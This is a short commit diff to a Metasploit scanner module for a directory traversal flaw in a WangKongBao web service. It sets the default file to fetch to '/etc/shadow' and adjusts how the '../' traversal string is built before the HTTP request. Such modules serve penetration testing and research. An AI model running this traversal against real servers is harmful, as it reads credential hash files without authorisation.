39f11633a95384c26582b81d85d938cb91ff395d
sinn3r <msfsinn3r@gmail.com>
2012-07-06 01:23:41 -0500

    Instead of deleting the "/", here's a different approach

--- modules/auxiliary/scanner/http/wangkongbao_traversal.rb
+++ modules/auxiliary/scanner/http/wangkongbao_traversal.rb
@@ -37,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(85),
-				OptString.new('FILEPATH', [false, 'The name of the file to download', 'etc/shadow']),
+				OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
 				OptInt.new('DEPTH', [true, 'Traversal depth', 10])
 			], self.class)
 	end
@@ -50,6 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		travs = "../" * datastore['DEPTH']
+		travs = travs[0,travs.rindex('/')]
 
 		# Create request
 		res = send_request_raw({
